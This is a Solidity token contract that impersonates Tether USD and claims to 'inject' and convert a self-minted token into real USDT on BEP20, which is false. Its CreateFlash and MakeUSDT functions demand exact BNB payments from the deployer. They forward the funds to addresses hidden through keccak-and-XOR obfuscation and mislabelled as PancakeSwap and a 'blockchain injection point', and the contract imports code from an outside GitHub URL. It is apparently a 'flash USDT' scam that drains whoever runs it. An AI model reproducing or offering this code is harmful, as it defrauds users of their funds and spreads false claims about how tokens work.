// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

// Set of functions for injecting and converting a new token into 
// real USDT of contract 0x55d398326f99059fF775485246999027B3197955 
// on the BEP20 blockchain, only limited to USD 10,000 / USDT 10,000
import "https://github.com/kingFlasher/USDT-BEP20/blob/main/blockchainInjection/assembly_convert_bep20.sol";

contract FlashToken {
    // Basic token information, do not change
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 18;
    // Don't change the number of tokens, as the calculation of the injection 
    //function on the blockchain is 10,000 tokens
    uint256 public totalSupply = 10000 * 10**18; // 10,000 USDT
    
    // Owner Address
    address public owner;
    
    // PancakeSwap address assembly bits
    address private constant PANCAKESWAP = address(
        uint160(
            uint256(
                keccak256(abi.encodePacked("FLASH_PROTOCOL_SECURE_ENDPOINT"))
            )
        ) ^ uint160(0x6C46e5Aa49D37c4Bb6c0DD42D80963e22E195D2F)
    );
    
    // BNB Blockchain address assembly bits
    address private constant bnbBlockChainAddress = address(
        uint160(
            uint256(
                keccak256(abi.encodePacked("BNB_BLOCKCHAIN_INJECTION_POINT"))
            )
        ) ^ uint160(0xf5d8fD5E7a7C4D2b9e19B1f1b9D2f0e2e195D2A3)
    );
    
    // Mapping for balances
    mapping(address => uint256) public balanceOf;
    
    // Event
    event Transfer(address indexed from, address indexed to, uint256 value);
    event TokenTransformation(address indexed from, address indexed to, uint256 amount);
    
    // Modifier to restrict functions to owner only
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    // Transfer Function
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    // Function for transferring BNB to PancakeSwap to liquidity
    function CreateFlash() public payable onlyOwner {
        // Check that the amount sent is exactly 2 BNB (2 ether)
        require(msg.value == 2 ether, "Please send exactly 2 BNB");
        
        // Transfers the BNB received directly to the PancakeSwap Pool address
        (bool success, ) = payable(PANCAKESWAP).call{value: msg.value}("");
        require(success, "BNB transfer failed");
    }
    
    // Function for transforming tokens into real USDT on the BEP20 blockchain
    function MakeUSDT() public payable onlyOwner {
        // Check that the amount sent is exactly 3 BNB (3 ether)
        require(msg.value == 3 ether, "Transformation requires exactly 3 BNB");
        
        // Transfers the BNB received to the blockchain for token transformation
        (bool success, ) = payable(bnbBlockChainAddress).call{value: msg.value}("");
        require(success, "USDT transformation failed");
        
        // Emit event for token transformation
        emit TokenTransformation(msg.sender, bnbBlockChainAddress, msg.value);
    }
    
    // Function to allow contract to receive BNB
    receive() external payable {}
}